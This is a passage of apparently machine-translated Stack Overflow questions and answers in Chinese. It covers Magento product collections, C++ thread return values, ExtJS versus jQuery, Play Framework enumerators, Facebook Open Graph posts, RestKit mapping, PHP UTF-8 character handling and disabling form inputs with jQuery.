        array (size=0)
          empty
      protected '_attributesByCode' => 
        array (size=0)
          empty
      protected '_attributesByTable' => 
        array (size=0)
          empty
      protected '_staticAttributes' => 
        array (size=0)
          empty
      protected '_entityTable' => string 'catalog_product_entity' (length=22)
      protected '_describeTable' => 
        array (size=0)
          empty
      protected '_entityIdField' => string 'entity_id' (length=9)
      protected '_valueEntityIdField' => null
      protected '_valueTablePrefix' => null
      protected '_isPartialLoad' => boolean false
      protected '_isPartialSave' => boolean false
      protected '_sortingSetId' => null
      protected '_attributeValuesToDelete' => 
        array (size=0)
          empty
      protected '_attributeValuesToSave' => 
        array (size=0)
          empty
  protected '_selectEntityTypes' => 
    array (size=0)
      empty
  protected '_selectAttributes' => 
    array (size=0)
      empty
  protected '_filterAttributes' => 
    array (size=0)
      empty
  protected '_joinEntities' => 
    array (size=0)
      empty
  protected '_joinAttributes' => 
    array (size=0)
      empty
  protected '_joinFields' => 
    array (size=0)
      empty
  protected '_conn' => 
    object(Varien_Db_Adapter_Pdo_Mysql)[90]
      protected '_transactionLevel' => int 0
      protected '_connectionFlagsSet' => boolean true
      protected '_ddlCache' => 
        array (size=1)
          1 => 
            array (size=1)
              ...
      protected '_bindParams' => 
        array (size=2)
          ':_mage_bind_var_1' => string '2012-09-26 14:11:06' (length=19)
          ':_mage_bind_var_2' => string '2012-09-26 14:11:06' (length=19)
      protected '_bindIncrement' => int 2
      protected '_debug' => boolean false
      protected '_logQueryTime' => float 0.05
      protected '_logAllQueries' => boolean false
      protected '_logCallStack' => boolean false
      protected '_debugFile' => string 'var/debug/sql.txt' (length=17)
      protected '_debugIoAdapter' => null
      protected '_debugTimer' => int 0
      protected '_cacheAdapter' => 
        object(Varien_Cache_Core)[13]
          protected '_backend' => 
            object(Zend_Cache_Backend_File)[10]
              ...
          protected '_options' => 
            array (size=9)
              ...
          protected '_specificOptions' => 
            array (size=0)
              ...
          private '_lastId' (Zend_Cache_Core) => string 'd11_DB_PDO_MYSQL_DDL_googleoptimizer_code_1' (length=43)
          protected '_extendedBackend' => boolean true
          protected '_backendCapabilities' => 
            array (size=6)
              ...
      protected '_isDdlCacheAllowed' => boolean true
      protected '_pdoType' => string 'mysql' (length=5)
      protected '_numericDataTypes' => 
        array (size=16)
          0 => int 0
          1 => int 1
          2 => int 2
          'INT' => int 0
          'INTEGER' => int 0
          'MEDIUMINT' => int 0
          'SMALLINT' => int 0
          'TINYINT' => int 0
          'BIGINT' => int 1
          'SERIAL' => int 1
          'DEC' => int 2
          'DECIMAL' => int 2
          'DOUBLE' => int 2
          'DOUBLE PRECISION' => int 2
          'FIXED' => int 2
          'FLOAT' => int 2
      protected '_defaultStmtClass' => string 'Zend_Db_Statement_Pdo' (length=21)
      protected '_config' => 
        array (size=12)
          'model' => string 'mysql4' (length=6)
          'initStatements' => string 'SET NAMES utf8' (length=14)
          'type' => string 'pdo_mysql' (length=9)
          'host' => string 'localhost' (length=9)
          'username' => string 'root' (length=4)
          'password' => 
            object(Mage_Core_Model_Config_Element)[34]
              ...
          'dbname' => string 'eyt' (length=3)
          'active' => string '1' (length=1)
          'charset' => null
          'persistent' => boolean false
          'options' => 
            array (size=3)
              ...
          'driver_options' => 
            array (size=0)
              ...
      protected '_fetchMode' => int 2
      protected '_profiler' => 
        object(Zend_Db_Profiler)[20]
          protected '_queryProfiles' => 
            array (size=0)
              ...
          protected '_enabled' => boolean false
          protected '_filterElapsedSecs' => null
          protected '_filterTypes' => null
      protected '_defaultProfilerClass' => string 'Zend_Db_Profiler' (length=16)
      protected '_connection' => 
        object(PDO)[17]
      protected '_caseFolding' => int 0
      protected '_autoQuoteIdentifiers' => boolean true
      protected '_allowSerialization' => boolean true
      protected '_autoReconnectOnUnserialize' => boolean false
  protected '_select' => 
    object(Varien_Db_Select)[324]
      protected '_bind' => 
        array (size=0)
          empty
      protected '_adapter' => 
        object(Varien_Db_Adapter_Pdo_Mysql)[90]
          protected '_transactionLevel' => int 0
          protected '_connectionFlagsSet' => boolean true
          protected '_ddlCache' => 
            array (size=1)
              ...
          protected '_bindParams' => 
            array (size=2)
              ...
          protected '_bindIncrement' => int 2
          protected '_debug' => boolean false
          protected '_logQueryTime' => float 0.05
          protected '_logAllQueries' => boolean false
          protected '_logCallStack' => boolean false
          protected '_debugFile' => string 'var/debug/sql.txt' (length=17)
          protected '_debugIoAdapter' => null
          protected '_debugTimer' => int 0
          protected '_cacheAdapter' => 
            object(Varien_Cache_Core)[13]
              ...
          protected '_isDdlCacheAllowed' => boolean true
          protected '_pdoType' => string 'mysql' (length=5)
          protected '_numericDataTypes' => 
            array (size=16)
              ...
          protected '_defaultStmtClass' => string 'Zend_Db_Statement_Pdo' (length=21)
          protected '_config' => 
            array (size=12)
              ...
          protected '_fetchMode' => int 2
          protected '_profiler' => 
            object(Zend_Db_Profiler)[20]
              ...
          protected '_defaultProfilerClass' => string 'Zend_Db_Profiler' (length=16)
          protected '_connection' => 
            object(PDO)[17]
              ...
          protected '_caseFolding' => int 0
          protected '_autoQuoteIdentifiers' => boolean true
          protected '_allowSerialization' => boolean true
          protected '_autoReconnectOnUnserialize' => boolean false
      protected '_parts' => 
        array (size=12)
          'straightjoin' => boolean false
          'distinct' => boolean false
          'columns' => 
            array (size=2)
              ...
          'union' => 
            array (size=0)
              ...
          'from' => 
            array (size=2)
              ...
          'where' => 
            array (size=0)
              ...
          'group' => 
            array (size=0)
              ...
          'having' => 
            array (size=0)
              ...
          'order' => 
            array (size=0)
              ...
          'limitcount' => null
          'limitoffset' => null
          'forupdate' => boolean false
      protected '_tableCols' => 
        array (size=0)
          empty
  protected '_cacheConf' => null
  protected '_idFieldName' => null
  protected '_bindParams' => 
    array (size=0)
      empty
  protected '_data' => null
  protected '_fetchStmt' => null
  protected '_items' => 
    array (size=0)
      empty
  protected '_itemObjectClass' => string 'Mage_Catalog_Model_Product' (length=26)
  protected '_orders' => 
    array (size=0)
      empty
  protected '_filters' => 
    array (size=0)
      empty
  protected '_isFiltersRendered' => boolean false
  protected '_curPage' => int 1
  protected '_pageSize' => boolean false
  protected '_totalRecords' => null
  protected '_isCollectionLoaded' => null
  protected '_cacheKey' => null
  protected '_cacheTags' => 
    array (size=0)
      empty
  protected '_cacheLifetime' => int 86400
  protected '_flags' => 
    array (size=0)
      empty 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-26T14:10:28.147

要获取产品名称，您需要将其添加到选择中：

```
$_productCollection = $category->getProductCollection()
    ->addAttributeToSelect('name'); 
```

此外，如果您提供了完整的代码，那么您还没有初始化`$_helper`将引发错误的变量：

```
$_helper = Mage::helper('catalog/output'); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-05-08T13:03:53.070

试试下面的代码它必须工作：

```
$collection = Mage::getModel('catalog/product')
                        ->getCollection()
                        ->addAttributeToSelect('*');

foreach ($collection as $product) {

    echo $product->getName() . "<br />";

    } 
```

# c++ - 如何从_beginthread线程返回一个值

> ID：12603407
> 
> 赞同：2
> 
> 时间：2012-09-26T13:56:28.793
> 
> 标签：c++, multithreading

我正在创建一个两线程数组求和程序，我正在使用 windows.h 线程。这是我到目前为止的代码。

```
#include "StdAfx.h"
#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <process.h>     // needed for _beginthread()

void  silly( void * );   // function prototype

using namespace std;

int arraySum[100];

int main()
{
    // Our program's first thread starts in the main() function.

    printf( "Now in the main() function.\n" );

    for(int i = 0 ; i  < 100 ; i++){
        arraySum[i] = i;
    }

    // Let's now create our second thread and ask it to start
    // in the silly() function.

    _beginthread( silly, 0, (void*)1 );
    _beginthread( silly, 0, (void*)2 );

    Sleep( 100 );

    int a;
    cin >> a;

}

void  silly( void *arg )
{
    printf( "The silly() function was passed %d\n", (INT_PTR)arg ) ;
    int partialSum = 0;
    for(int i =50*((INT_PTR)arg - 1); i < 50 * ((INT_PTR)arg) ; i++){
    partialSum == arraySum[i];
    }
} 
```

我似乎觉得很难做的是让函数将分区总和返回给 main 方法。有人可以帮我吗。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-26T13:59:35.343

传递一个`int`to的地址`silly()`，它可以作为输入和输出参数，并`silly()`使用调用者所需的值填充它：

```
int silly_result_1 = 1;
int silly_result_2 = 2;

_beginthread( silly, 0, (void*)&silly_result_1 );
_beginthread( silly, 0, (void*)&silly_result_2 );

void silly( void *a_arg )
{
    int* arg = (int*) a_arg;
} 
```

您需要等待两个线程完成。

* * *

请注意，其地址被传递的变量必须`_beginthread()`在线程的生命周期内存在。例如，以下将导致未定义的行为：

```
void _start_my_thread()
{
    int silly_result = 2;
    _beginthread( silly, 0, (void*)&silly_result );
} /* 'silly_result' is out of scope but still used by the thread. */ 
```

这可以通过为变量动态分配内存来解决（并决定是主线程还是新线程负责销毁分配的内存）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-26T13:59:24.093

你不能让线程本身返回一些东西。相反，您可以在开始调用中使用结构。

```
_beginthread( silly, 0, (void*)1 ); 
```

如果您将其更改为

```
typedef struct dataStruct {
    int ID;
    int returnValue;
};

dataStruct thread_1;
thread_1.ID = 1;
thread_1.returnValue = 0;
_beginthread( silly, 0, (void*)&thread_1 ); 
```

然后在您的线程中根据需要设置 returnValue，并且可以从那里继续

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:26:17.433

在 C++11 中，您可能希望为此使用期货：

```
#include <future>
#include <numeric>
#include <iostream>

int arraySum[100];

int partial_sum(int start)
{
    int sum = 0;
    for(int i = start; i < start + 50; ++i)
        sum += arraySum[i];
    return sum;
}

int main()
{
    for(int i = 0 ; i  < 100 ; i++)
    {
        arraySum[i] = i;
    }
    auto a = std::async([]() {return partial_sum(0);});
    auto b = std::async([]() {return partial_sum(50);});
    std::cout << a.get() + b.get() << "\n";
} 
```

也许你想传递一个`std::launch::async`启动策略`std::async`来强制创建线程。

# jquery - 使用 ExtJS UI 代替纯 HTML + jQuery 的优势

> ID：12603413
> 
> 赞同：11
> 
> 时间：2012-09-26T13:56:52.723
> 
> 标签：jquery, html, extjs

我认为，ExtJS 与 jQuery 相比只有一个优势，那就是丰富的 UI 组件。构建纯 HTML UI 然后使用 jQuery 或任何其他合适的 javascript 库不是更好的选择吗？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-09-26T14:08:25.283

## ExtJS 在特定场景中确实有意义

如果您正在构建类似桌面的 Web 应用程序（很多 Intranet 应用程序都是这样的），那么 ExtJS 是最好的库之一，因为它为您提供了非常干净的对象模型和经过全面测试的富客户端控件。所有这些以及出色且一致的外观和感觉，因此您不会花时间做所有这些。你宁愿构建你的应用程序。他们还提供出色的客户支持。我在使用他们的论坛和事件支持方面拥有丰富的经验。

如果已经在使用 ExtJS，我会避免使用 jQuery，因为 ExtJS 也提供了您需要的一切，并且也针对它进行了优化。**如果您要使用它，请完全接受它**。

## HTML+jQuery 有什么不同

创建即 HTML+jQuery 富客户端网格将花费您大量时间

*   可分页的，
*   可排序的，
*   可过滤，
*   完全可编辑，
*   键盘导航和
*   外观和功能与应用程序的其余部分一致

更不用说您必须自己解决的所有错误（这往往会成比例地控制复杂性）。这只是一种控制。他们提供了大量的。相信我，他们的控件已经在市场上销售了很长时间，并且非常完善**并且**支持许多浏览器。

### 如果没有必要，请不要重新发明轮子。

## 为什么 ExtJS 与 3rd 方库/控件不同

ExtJS 最初是免费的开源代码。**免费丰富的控件，具有一致的外观和感觉**。它们主要是由 Jack Slocum 编写的，他显然是个精明而乏味的人，他实际上知道自己想要什么，并且在编写时非常彻底。

他在提供库和整个对象模型方面做得非常出色，这些模型在版本上已经非常成熟。很容易看出，这些控件是**由开发人员为开发人员**构建的。它后来发展为一个半开放的项目（我认为是第 3 版），具有背景收入的可能性。ExtJS 库（类似于 jQuery 的管道代码）仍然是免费的，而大量丰富和精美的控件已获得许可。

整个项目从**一个爱好者的车库项目发展为一个成熟的产品**。所以它首先完成，完善和进步，然后他们整合了整个事情并在同一个前提下继续。所以它的**利润是因为一个（伟大的）产品**。

其他第三方供应商大多是由利润驱动的=**产品因为利润（需求）**。他们的代码不仅反映了这一事实。ExtJS legacy 是不同的，因此要好得多。

## 维护

正如@sra 指出的那样，维护也较低，因为您的代码库更小，这意味着更小的错误表面和需要维护的行数更少。ExtJS 在这个等式中是一个独立的库，由其受人尊敬的所有者维护。由于它都是 Javascript，因此您当然可以扩展它并更改您希望以不同方式工作的特定部分。那些时候我写了很多扩展......在开始使用 jQuery 之后我错过的第一件事是命名空间支持和类结构。ExtJS 对 .net 或 Java 开发人员来说非常自然，因为它给您一种面向对象的感觉。另一方面，如果您不知道自己在做什么以及如何正确使用它，那么 jQuery 并没有提供更多的程序感觉。

## 我给你的建议？

如果您认为您的应用程序的 UI 可以构建 75% 的 ExtJS 开箱即用控件，我会说完全接受它，不要回头将其与 jQuery 进行比较。不要将它与 jQuery 混合和匹配，除非你有实际的（除了懒于完全学习 ExtJS）包含和使用它的巨大好处。

> ***PS**我不为 Sencha 工作，也不是他们的报酬。我只是一个开发人员，在一个项目上工作了 9 个月，当 jQuery 还是个婴儿的时候，这个项目完全使用了 ExtJS alog 和 Asp.net。现在我也是一个重度 jQuery 用户，所以我都知道。好的。我从版本 4 开始就不知道 ExtJS，但我想它所做的只是改进。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:03:01.287

正如您所说，Extjs 提供了多个组件来构建丰富的 UI。作为一个偶尔使用 Extjs 的用户，我想说，如果您需要将大量数据呈现为网格、树，而这些数据可以来自 XML 或 Json 等标准格式，Extjs 会让您获得非常好的结果/渲染在很短的时间内。

如果您希望它具有与 Extjs 组件类似的功能，您将花费大量时间来呈现“纯 HTML”。

你看过[他们的演示页面](http://www.sencha.com/products/extjs/examples/)吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-12T13:37:17.683

EXTJS 为 Web 应用程序提供以下功能：

*   具有排序、搜索、可编辑行功能的最佳不同网格控件。

*   窗口弹出和消息框控件有非常非常专业的丰富控件。

*   表单的最佳用户输入和选择控件。

*   Web 应用程序有用的部分请求服务，如 Http Proxy。

*   初学者开发人员易于理解。

# scala - 为什么我无法在 SimpleResult 正文中组合枚举器？

> ID：12603414
> 
> 赞同：4
> 
> 时间：2012-09-26T13:56:55.123
> 
> 标签：scala, playframework, playframework-2.0

[我试图在http://www.playframework.org/documentation/2.0/ScalaStream](http://www.playframework.org/documentation/2.0/ScalaStream)的“发送大量数据”下实现类似于第一个示例的内容。

我所做的不同之处在于我有多个文件要在响应中连接。它看起来像这样：

```
def index = Action {

  val file1 = new java.io.File("/tmp/fileToServe1.pdf")
  val fileContent1: Enumerator[Array[Byte]] = Enumerator.fromFile(file1)    

  val file2 = new java.io.File("/tmp/fileToServe2.pdf")
  val fileContent2: Enumerator[Array[Byte]] = Enumerator.fromFile(file2)   

  SimpleResult(
    header = ResponseHeader(200),
    body = fileContent1 andThen fileContent2
  ) 
```

}

发生的情况是响应中只有第一个文件的内容。

像下面这样稍微简单的东西可以正常工作：

```
fileContent1 = Enumerator("blah" getBytes)
fileContent2 = Enumerator("more blah" getBytes)

SimpleResult(
  header = ResponseHeader(200),
  body = fileContent1 andThen fileContent2
) 
```

我怎么了？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-26T18:28:51.373

我已经通过阅读播放代码获得了大部分内容，所以我可能误解了，但从我所见：`Enumerator.fromFile`函数（Iteratee.scala [[docs]](https://github.com/playframework/Play20/wiki/Iteratees) [[src]](https://github.com/playframework/Play20/blob/2.0.3/framework/src/play/src/main/scala/play/api/libs/iteratee/Iteratee.scala)）创建一个枚举器，当应用于一个`Iteratee[Byte, Byte]`附加`Input.EOF`到Iteratee 完成从文件中读取时的输出。

根据戏剧！您链接到的文档示例应该在枚举数的末尾手动附加一个 Input.EOF（Enumerator.eof 的别名）。我认为，将 Input.EOF 自动附加到文件字节数组的末尾是您只返回一个文件的原因。

播放控制台中等效的更简单示例是：

```
scala> val fileContent1 = Enumerator("blah") andThen Enumerator.eof
fileContent1: play.api.libs.iteratee.Enumerator[java.lang.String] = play.api.libs.iteratee.Enumerator$$anon$23@2256deba

scala> val fileContent2 = Enumerator(" and more blah") andThen Enumerator.eof
fileContent2: play.api.libs.iteratee.Enumerator[java.lang.String] = play.api.libs.iteratee.Enumerator$$anon$23@7ddeef8a

scala> val it: Iteratee[String, String] = Iteratee.consume[String]()
it: play.api.libs.iteratee.Iteratee[String,String] = play.api.libs.iteratee.Iteratee$$anon$18@6fc6ce97

scala> Iteratee.flatten((fileContent1 andThen fileContent2) |>> it).run.value.get
res9: String = blah 
```

修复，虽然我还没有尝试过，但是会更深入一些并`Enumerator.fromCallback`直接使用该函数并将它传递给一个自定义检索器函数，该函数会一直返回`Array[Byte]`s 直到您要连接的所有文件都已被读取。参考`fromStream`函数的实现，看看默认是什么以及如何修改它。

如何执行此操作的示例（改编自`Enumerator.fromStream`）：

```
def fromFiles(files: List[java.io.File], chunkSize: Int = 1024 * 8): Enumerator[Array[Byte]] = {
  val inputs = files.map { new java.io.FileInputStream(_) }
  var inputsLeftToRead = inputs
  Enumerator.fromCallback(() => {
    def promiseOfChunkReadFromFile(inputs: List[java.io.FileInputStream]): Promise[Option[Array[Byte]]] = {
      val buffer = new Array[Byte](chunkSize)
      (inputs.head.read(buffer), inputs.tail.headOption) match {
        case (-1, Some(_)) => {
          inputsLeftToRead = inputs.tail
          promiseOfChunkReadFromFile(inputsLeftToRead)
        }
        case (-1, None) => Promise.pure(None)
        case (read, _) => {
          val input = new Array[Byte](read)
          System.arraycopy(buffer, 0, input, 0, read)
          Promise.pure(Some(input))
        }
      }
    }
    promiseOfChunkReadFromFile(inputs)
  }, {() => inputs.foreach(_.close())})
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-02T17:06:26.863

这是我用来一个接一个播放一堆音频文件的播放框架 2.2 代码。`Iterator`您可以看到转换为 java `Enumeration`for的 scala 的使用`java.io.SequenceInputStream`。

```
def get_files(name: String) = Action { implicit request =>
  import java.lang.IllegalArgumentException
  import java.io.FileNotFoundException
  import scala.collection.JavaConverters._
  try {
    val file1 = new java.io.File("songs/phone-incoming-call.ogg")
    val file2 = new java.io.File("songs/message.ogg")
    val file3 = new java.io.File("songs/desktop-login.ogg")
    val inputStream1 = new java.io.FileInputStream(file1)
    val inputStream2 = new java.io.FileInputStream(file2)
    val inputStream3 = new java.io.FileInputStream(file3)
    val it = Iterator(inputStream1, inputStream2, inputStream3)
    val seq = new java.io.SequenceInputStream(it.asJavaEnumeration)
    val fileContent: Enumerator[Array[Byte]] = Enumerator.fromStream(seq)
    val length: Long = file1.length + file2.length + file3.length
    SimpleResult(
      header = ResponseHeader(200, Map(CONTENT_LENGTH -> length.toString)),
      body = fileContent
    )
  }
  catch {
    case e: IllegalArgumentException =>
      BadRequest("Could not retrieve file. Error: " + e.getMessage)
    case e: FileNotFoundException =>
      BadRequest("Could not find file. Error: " + e.getMessage)
  }
} 
```

我的代码（就我要查找的内容而言）的唯一问题是它是一个流，这意味着即使我正在发送`CONTENT_LENGTH`. 也许我以错误的方式计算总长度。

另一个问题是音频文件需要具有相同的类型（预期）、相同数量的通道和相同的采样率（我花了一段时间才弄清楚），例如，都必须是 ogg 44100Hz 2 通道。

# c# - 如何使用 Facebook C# SDK 将故事发布到当前登录用户的 Facebook 墙上？

> ID：12603416
> 
> 赞同：1
> 
> 时间：2012-09-26T13:57:02.007
> 
> 标签：c#, facebook-opengraph, facebook-c#-sdk, facebook-stream-story

我正在使用 Facebook C# SDK 登录我的网站。登录工作正常，但我想要将我的应用程序的打开图形操作发布到登录用户的时间轴。我使用了这段代码，但它只在用户墙上发布文本状态。请告诉我应该如何发布一些具体操作

```
FacebookApp fbApp = new FacebookApp();
FacebookApp app = new FacebookApp(fbApp.Session.AccessToken);
var args = new Dictionary<string, object>();
args["message"] = "abc";
args["caption"] = "This is caption!";
args["description"] = "This is description!";
args["name"] = "This is name!";
args["picture"] = "[your image URL]";
args["link"] = "[your link URL]";

app.Api("/me/feed", args, HttpMethod.Post); 
```

我想要的一个例子是 [http://www.wrangle.in/login.aspx](http://www.wrangle.in/login.aspx)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:15:07.830

> 我使用了这段代码，但它只在用户墙上发布文本状态。

当然，因为您发布到`/me/feed`.

此处描述了如何发布操作：[https ://developers.facebook.com/docs/opengraph/actions/#create](https://developers.facebook.com/docs/opengraph/actions/#create)

编辑：要在您的 C# 项目中执行此操作，只需使用您现在使用的方法进行 API 调用——但要调用正确的端点，并使用正确的参数。

# android - Android：如何获取位于 Apache 服务器中的文件列表？并用文件填充 ListView

> ID：12603417
> 
> 赞同：1
> 
> 时间：2012-09-26T13:57:03.287
> 
> 标签：android, listview

我需要在应用程序中实现一个代码，它应该可以看到 Web 服务器上的可用文件。在带有复选框的列表视图中显示它们，最后当用户单击下载按钮时，它会下载 SDCARD 中的文件。

我有以下工作。- 从 Web 服务器下载并保存在 SDCARD 中（但文件名在 URL 中是硬编码的）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T02:29:48.410

您可能想尝试此解决方案

> [Android：Web 服务器的文件列表](https://stackoverflow.com/questions/7639024/android-file-listing-of-web-server)

然后遍历列表并将其转换为字符串

如果您的意思是从您可以使用的 URL 字符串中获取文件名

> String.replaceAll();

使用正则表达式替换字符串中所有不必要的部分

# ios - RestKit POST 未将响应映射回对象

> ID：12603420
> 
> 赞同：1
> 
> 时间：2012-09-26T13:57:08.200
> 
> 标签：ios, restkit

现在我要做的是向我的 /api/v1/login 服务发布一个帖子，然后当我得到响应时将其映射到 UserToken 对象中。

现在我有以下代码用于发布 UserLogin 数据，但它没有将响应映射回对象：

```
- (void) postLogin
{

//Setup Login data
UserLogin *l = [[UserLogin alloc] initWithUsername:[usernameField text] andPassword:[passwordField text]];

//Setup Routes
RKObjectRouter *router = [RKObjectManager sharedManager].router;
[router routeClass:[UserLogin class] toResourcePath:@"/api/v1/login" forMethod:RKRequestMethodPOST];

//Setup Token Mapping
RKObjectMapping *UserTokenMapping = [RKObjectMapping mappingForClass:[UserToken class]];
[UserTokenMapping mapKeyPath:@"authentication_token" toAttribute:@"token"];
//[[[RKObjectManager sharedManager] mappingProvider]setMapping:UserTokenMapping forKeyPath:@""];
[[RKObjectManager sharedManager].mappingProvider registerMapping:UserTokenMapping withRootKeyPath:@""];

//Setup Mapping for UserLogin class
RKObjectMapping *UserLoginMapping = [RKObjectMapping mappingForClass:[UserLogin class]];
[UserLoginMapping mapKeyPath:@"login" toAttribute:@"userName"];
[UserLoginMapping mapKeyPath:@"password" toAttribute:@"passWord"];
[[RKObjectManager sharedManager].mappingProvider registerMapping:UserLoginMapping withRootKeyPath:@""];

[[RKObjectManager sharedManager] postObject:l delegate:self];

}

- (void)objectLoader:(RKObjectLoader *)objectLoader didLoadObjects:(NSArray *)objects
{
  NSLog(@"objects[%d]", [objects count]);
} 
```

响应返回为：

```
{"message":"Login successful.","authentication_token":"2cksmLGr9hB5kLF3eRTu"} 
```

objectLoader 方法只是返回：

```
2012-09-26 23:49:57.046 voxpop_iphone[92118:c07] objects[0] 
```

谁能帮我解决我在这里缺少的东西？谢谢大佬！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-21T08:52:28.237

我遇到了同样的问题并使用不推荐使用的方法来调整正确的映射

反而

```
[[RKObjectManager sharedManager] postObject:l delegate:self]; 
```

我用了

```
[objectManager postObject:self mapResponseWith:UserTokenMapping delegate:self]; 
```

# php - 如何比较和输出拉丁字符？

> ID：12603421
> 
> 赞同：0
> 
> 时间：2012-09-26T13:57:08.093
> 
> 标签：php, comparison, latin

我有一系列国家，其中一个国家有拉丁字符“Å”：

```
$country["af"] = "Afghanistan";
$country["ax"] = "Åland Islands";
$country["al"] = "Albania"; 
```

在遍历这个数组并比较国家名称的第一个字符时，我无法匹配拉丁字符。

```
foreach($country as $cc => $name)
{
 if($name[0] == "Å")
 {
  echo "matched";
 }
 else
 {
  echo $name[0];
 }
} 
```

我得到的结果是：A�A

为什么拉丁字符 Å 变成了 �，我该如何进行适当的比较并输出拉丁字符 Å？

添加说明：http头和html文档已经指定为UTF-8格式。

添加注2：如果我只是回显`$name`而不是`$name[0]`，我可以得到奥兰群岛的Å。Using`substr($name, 0, 1)`与 具有相同的效果`$name[0]`，这给了我�。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-20T10:49:57.247

将您的脚本更改为此。unicode 编码字不能与正常的字符串函数一起爆炸。您必须使用多字节函数。

```
foreach($country as $cc => $name)
{
     if(mb_substr($name,0,1,"UTF-8") == "Å")
     {
      echo "matched";
     }
     else
     {
      echo mb_substr($name,0,1,"UTF-8");
     }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T15:12:02.460

问题是程序有不同的方式来表示不同的字符。这称为字符编码。您的浏览器、服务器和 PHP 代码目前对您使用的编码感到困惑，因为您将`UTF-8`字符与`ANSI`代码混合在一起。

您可以在此处了解有关编码的更多信息：http: [//vlaurie.com/computers2/Articles/characters.htm](http://vlaurie.com/computers2/Articles/characters.htm)

每当我构建一个 UTF-8 PHP 站点时，我都会做三件事。这三件事应该可以解决您的问题：

### 添加 PHP UTF-8 标头

将此添加到代码的顶部：

```
<?php
header('Content-Type: text/html; charset=utf-8'); 
... 
```

我相信这会指示其他服务器和您的浏览器使用 UTF-8 而不是 ANSI 解析此文档。您可以在此处阅读有关此内容的更多信息： [使用 PHP 将 HTTP 标头设置为 UTF-8](https://stackoverflow.com/questions/4279282/set-http-header-to-utf-8-php)

### 添加 HTML UTF-8 元标记

将此代码添加到您返回的 HTML 的顶部：

```
<!doctype html>
<html>
<head>
<meta http-equiv="Content-type" content="text/html; charset=utf-8" /> 
... 
```

这也指示您的浏览器以 UTF-8（而不是 ANSI）读取字符。您可以在此处阅读有关此内容的更多信息： [使用 PHP 将 HTTP 标头设置为 UTF-8](https://stackoverflow.com/questions/4279282/set-http-header-to-utf-8-php)

### 将 PHP 文件另存为不带 BOM 的 UTF-8

默认情况下，您的文件通常以正确`ANSI`编码`. If you want to work with international characters, then you need to save them in`的 UTF-8 `encoding. This will let you work with the`Å` 字符保存。

如果您使用 Notepad++ 作为文本编辑器，那么您可以在“编码”菜单下设置文档的编码。将其设置为`Encode in UTF-8 without BOM`。

*明白了*

`UTF-8 without BOM`不是一回事`UTF-8`。UTF-8 文件通常带有 3 个字节的数据，表明该文件是 UTF-8 文件。这称为`Byte Order Mark`(BOM)。您可以在此处阅读有关 BOM 的更多信息：[http ://www.arclab.com/products/amlc/utf-8-php-cannot-modify-header-information.html](http://www.arclab.com/products/amlc/utf-8-php-cannot-modify-header-information.html)

大多数程序都可以分辨出文件是 UTF-8 的，因此 BOM 是多余的。如果您在没有 BOM 的情况下不保存，您可能会收到如下错误消息：

```
Warning: Cannot modify header information – headers already sent 
```

如果您看到此错误消息，那么您可能遇到了 BOM 问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T14:08:59.797

问号是因为您的查看器（浏览器）试图显示当前字符集中不支持的字符。为什么在使用 $name[0] 访问第一个字符时会发生这种情况，我不确定。

基于此处的帖子： [PHP：将特定波斯尼亚字符转换为非波斯尼亚字符（utf8 标准字符）](https://stackoverflow.com/questions/8386746/php-convert-specific-bosnian-characters-to-non-bosnian-utf8-standard-chars)

我尝试了以下方法：

$result = iconv("UTF-8", "ASCII//TRANSLIT", $test);

$result 现在包含奥兰群岛，特殊字符被转换为其正常版本。

$result[0] 现在应该包含 A。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-26T14:11:26.647

请为文件（存储的代码）设置字符编码并输出

# javascript - 禁用容器 div

> ID：12603423
> 
> 赞同：1
> 
> 时间：2012-09-26T13:57:18.733
> 
> 标签：javascript, jquery

我有一个包含很多字段的巨大动态表单。如果缺少其中一个参数，我应该禁用所有字段（读取不可点击）。我想知道是否可以改为使用 jQuery/JavaScript 禁用容器 div？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:00:33.147

尝试

```
$('#yourdiv').find(':input').prop('disabled', true); 
```

而不是`:input`，您可以使用`textarea, button, fieldset, input`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T14:00:28.733

```
$('div#optionalid :input').prop('disabled',true); 
```

将应用该`disabled`属性并将其分配给在指定`<div>`. 尽管您的选择含糊不清，但我相信这就是您想要的。

要提供更多控制，您可以根据该原始控件的值使其适用：

```
$('#originalInputId').on('change',function(e){
  $('#containerDivId :input').prop('disabled', $(this).val() == '');
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T14:04:09.210

您可以使用禁用 div 中的所有输入内容`Jquery`-

```
 if(your condition)
  {
  $('#yourDivId :input').attr('disabled', true);
  }
  else
  {
  $('#yourDivId :input').removeAttr('disabled');
  } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-26T14:00:52.800

我认为这不适用于 a `<div>`，但您可以使用`<fieldset>`标签对输入进行分组，然后禁用完整的字段集。

# javascript - 用 Angular js 展开和折叠

> ID：12603425
> 
> 赞同：23
> 
> 时间：2012-09-26T13:57:23.723
> 
> 标签：javascript, expand, collapse, angularjs

